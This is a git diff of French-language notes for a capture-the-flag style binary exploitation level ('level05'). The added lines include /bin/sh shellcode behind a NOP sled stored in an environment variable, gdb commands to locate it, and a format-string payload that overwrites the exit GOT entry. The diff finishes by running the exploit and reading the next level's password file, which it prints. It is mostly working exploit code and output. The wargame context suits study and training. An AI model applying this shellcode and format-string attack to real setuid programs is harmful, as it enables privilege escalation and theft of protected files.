@@ -19,31 +19,33 @@ On va modifier exit pour qu'il jump au shellcode ci-dessous:
 # "\xcd\x80"; // int 0x80
 
 # bash:
-export PAYLOAD05=$(python -c "print '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
+	export PAYLOAD05=$(python -c "print '\x90'*500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")
+
 	<!-- > export PAYLOAD05=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") -->
 
 # gdb:
 	> b main
 	> r
-	> x/s *((char **)environ+16)
-<<< 0xffffdf34:	 "PAYLOAD05=j\vX\231Rh//shh/bin\211\343\061\311̀"
-	> x/s 0xffffdf3e
-<<< 0xffffdf3e:	 "j\vX\231Rh//shh/bin\211\343\061\311̀"
+	> x/200s environ
+<<< 0xffffdd40: "PAYLOAD05=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\..."
+	> x/200c 0xffffdd40
+<<< 0xffffdd40:	80 'P' 65  'A' 89  'Y' 76  'L' 79  'O' 65  'A' 68  'D' 48  '0'
+0xffffdd48: 53  '5' 61  '=' -112  '\220' -112  '\220' -112  '\220' -112  '\220' -112  '\220' -112  '\220'
+0xffffdd50: -112  '\220' -112  '\220' -112  '\220' -112  '\220' -112  '\220'	-112 '\220'	-112 '\220'	-112 '\220'
 
-Notre payload a l'adresse 0xffffdf3e
+Prenons une adresse de notre payload dans le nop sled, par exemple 0xffffdd58
 
-0xffffdf3c
-0xffffdf3c - 8 = FFFFDF34
+0xffffdd58
+0xffffdd58 - 8 = ffff dd50
+dd50 = 56656
+ffff - dd58 = 8879	
 
 # bash:
-	b *0x0804850c
-	r < <(cat /tmp/payload05)
-	x/24bx 0xffffd678
+	<!-- b *0x0804850c -->
+	<!-- r < <(cat /tmp/payload05) -->
+	<!-- x/24bx 0x080497e0 -->
 
-	python -c 'print "\xff\xff\xd6\x78"[::-1] + "\xff\xff\xd6\x7a"[::-1] + "%57142c" + "%10$hn" + "%8385c" + "%11$hn"' > /tmp/payload05
-
-	python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%57140c" + "%10$hn" + "%8387c" + "%11$hn"' > /tmp/payload05
-
-	x/24bx 0x08048370
-0x8048370 <exit@plt>:	0xff 0x25 0xe0 0x97 0x04 0x08 0x68 0x18
-0x8048378 <exit@plt+8>: 0x00 0x00 0x00 0xe9 0xb0 0xff 0xff 0xff
+	> python -c 'print "\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%56656c" + "%10$hn" + "%8871c" + "%11$hn"' > /tmp/payload05
+	> cat /tmp/payload05 - | ./level05
+	> cat /home/users/level06/.pass
+<<< h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
